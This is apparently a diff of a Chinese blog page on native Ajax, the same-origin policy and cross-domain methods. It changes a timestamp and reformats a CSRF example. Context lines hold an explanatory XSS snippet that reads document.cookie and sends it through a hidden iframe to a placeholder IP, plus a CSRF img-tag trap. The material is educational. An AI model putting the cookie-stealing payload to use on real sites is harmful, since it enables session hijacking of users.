@@ -17,7 +17,7 @@
 <meta property="og:url" content="http://lx15.github.io/2017/02/21/Ajax_Json_Jsonp/index.html">
 <meta property="og:site_name" content="Lx15的博客">
 <meta property="og:description" content="总是在用ajax,但是原理实现并不清楚，总是会和同源策略打交道，但具体是什么也说不清楚，总在用跨域方案，但问我怎么跨域的又是不知其所以然，所以这篇文章就是解决自己的这些问题，如果你也是这种情况，那你也可以看看哦^^">
-<meta property="og:updated_time" content="2017-02-24T12:11:37.020Z">
+<meta property="og:updated_time" content="2017-02-26T09:22:07.135Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="原生Ajax使用实现、同源策略及CORS等跨域方案">
 <meta name="twitter:description" content="总是在用ajax,但是原理实现并不清楚，总是会和同源策略打交道，但具体是什么也说不清楚，总在用跨域方案，但问我怎么跨域的又是不知其所以然，所以这篇文章就是解决自己的这些问题，如果你也是这种情况，那你也可以看看哦^^">
@@ -151,8 +151,10 @@
 </blockquote>
 <h2 id="XSS-与CSRF"><a href="#XSS-与CSRF" class="headerlink" title="XSS 与CSRF"></a>XSS 与CSRF</h2><p>XSS 全称“跨站脚本”，是注入攻击的一种。通过XSS攻击，设置利用js脚本调用document.cookie 以窃取Cookie 信息，盗走用户的session_id ,然后使用此会话id伪装成用户，达到攻击的目的。这就是会话劫持（Session Hijack）</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">window, document</span>) </span>&#123;</div><div class="line">	<span class="comment">// 构造泄露信息用的 URL</span></div><div class="line">	<span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie;</div><div class="line">	<span class="keyword">var</span> xssURIBase = <span class="string">"http://192.168.123.123/myxss/"</span>;</div><div class="line">	<span class="keyword">var</span> xssURI = xssURIBase + <span class="built_in">window</span>.encodeURI(cookies);</div><div class="line">	<span class="comment">// 建立隐藏 iframe 用于通讯</span></div><div class="line">	<span class="keyword">var</span> hideFrame = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</div><div class="line">	hideFrame.height = <span class="number">0</span>;</div><div class="line">	hideFrame.width = <span class="number">0</span>;</div><div class="line">	hideFrame.style.display = <span class="string">"none"</span>;</div><div class="line">	hideFrame.src = xssURI;</div><div class="line">	<span class="comment">// 开工</span></div><div class="line">	<span class="built_in">document</span>.body.appendChild(hideFrame);</div><div class="line">&#125;)(<span class="built_in">window</span>, <span class="built_in">document</span>);</div></pre></td></tr></table></figure>
-<p>CSRF:”跨站点请求伪造”攻击 是值攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。<br>案例情景： 1. 用户A认真了用户A身份，在网站上留下了Cookie           </p>
-<pre><code>2. 另一个人 留下评论&lt;img src=&quot;http://tongyige.com/.....&quot;&gt;          
+<p>CSRF:”跨站点请求伪造”攻击 是值攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。</p>
+<p>案例情景：</p>
+<pre><code>1. 用户A认真了用户A身份，在网站上留下了Cookie           
+2. 另一个人 留下评论&lt;img src=&quot;http://tongyige.com/.....&quot;&gt;          
 3. 用户A触发陷阱。。。            
 </code></pre><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol>
 <li>阮一峰 <a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" target="_blank" rel="external">浏览器同源政策及其规避方法</a></li>
